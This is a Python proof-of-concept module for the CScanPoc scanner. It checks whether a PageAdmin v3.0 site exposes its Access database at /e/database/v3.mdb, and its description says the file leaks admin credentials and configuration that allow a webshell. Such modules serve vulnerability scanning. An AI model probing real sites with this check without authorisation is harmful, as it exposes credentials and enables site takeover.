# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'PageAdmin_0001'  # 平台漏洞编号，留空
    name = 'PageAdmin v3.0 /e/database/v3.mdb 数据库发现漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2014-05-22'  # 漏洞公布时间
    desc = '''
        PageAdmins网站管理系统采用Div+Css标准化设计，符合W3C标准。兼容主流浏览器，网站系统可免费下载、免费使用、无使用时间与任何功能限制。主要用于公司企业网站、学校类和信息类网站搭建。
        PageAdmin数据库下载漏洞 ，可以获取管理员账号，密码、配置信息等非常敏感的信息，可以轻松实现无任何限制获取 WEBSHELL。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'PageAdmin'  # 漏洞应用名称
    product_version = 'v3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'c094a3dd-c78a-4758-a067-9538b73320b0'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            verify_url = ('%s/e/database/v3.mdb') % self.target

            req = requests.get(verify_url)
            if req.status_code == 200 and 'configuration' in req.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
